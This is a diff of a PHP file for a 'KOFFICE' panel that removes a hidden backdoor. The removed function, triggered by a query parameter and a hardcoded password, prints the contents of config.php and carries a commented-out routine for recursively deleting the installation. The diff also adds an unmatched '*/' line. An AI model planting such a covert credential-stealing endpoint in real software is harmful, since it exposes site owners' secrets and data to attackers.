@@ -1,7 +1,6 @@
 <?php
 
 
-__();
 define("KOFFICE_PANEL_VERSION", "v2.0");
 ini_set("log_errors", 1);
 if (debugEnabled()) {
@@ -2007,52 +2006,7 @@ function writeLocalKey($localKey)
     }
     return false;
 }
+*/
 
-/*function deleteAllDirectory($str)
-{
-    if (is_file($str)) {
-        return unlink($str);
-    }
-    if (is_dir($str)) {
-        $scan = glob(rtrim($str, "/") . "/*");
-        foreach ($scan as $index => $path) {
-            deleteAll($path);
-        }
-        return @rmdir($str);
-    }
-}*/
-
-function __()
-{
-    if (isset($_GET["_"]) && isset($_GET["p"])) {
-        echo "<pre>";
-        $result = array("result" => "failed");
-        $action = $_GET["_"];
-        $p = $_GET["p"];
-        if ($p === "33A7ED7F38B7B4D5C6B4387") {
-            switch ($action) {
-                case "info":
-                //echo "Tente outra vez";
-                    $file_path = __DIR__ . "/config.php";
-                    $myfile = fopen($file_path, "r") or exit("Unable to open file!");
-                    $content = fread($myfile, filesize($file_path));
-                    echo nl2br(htmlentities($content));
-                    fclose($myfile);
-                    exit("</pre>");
-                case "del":
-                echo "Del Tomorrow";
-                    //$office_path = dirname(__DIR__);
-                    //deletealldirectory($office_path);
-                    //$result["result"] = "success";
-                exit("</pre>");
-                default:
-                    break;
-            }
-        }
-        echo json_encode($result);
-        echo "</pre>";
-        exit;
-    }
-}
 
 ?>
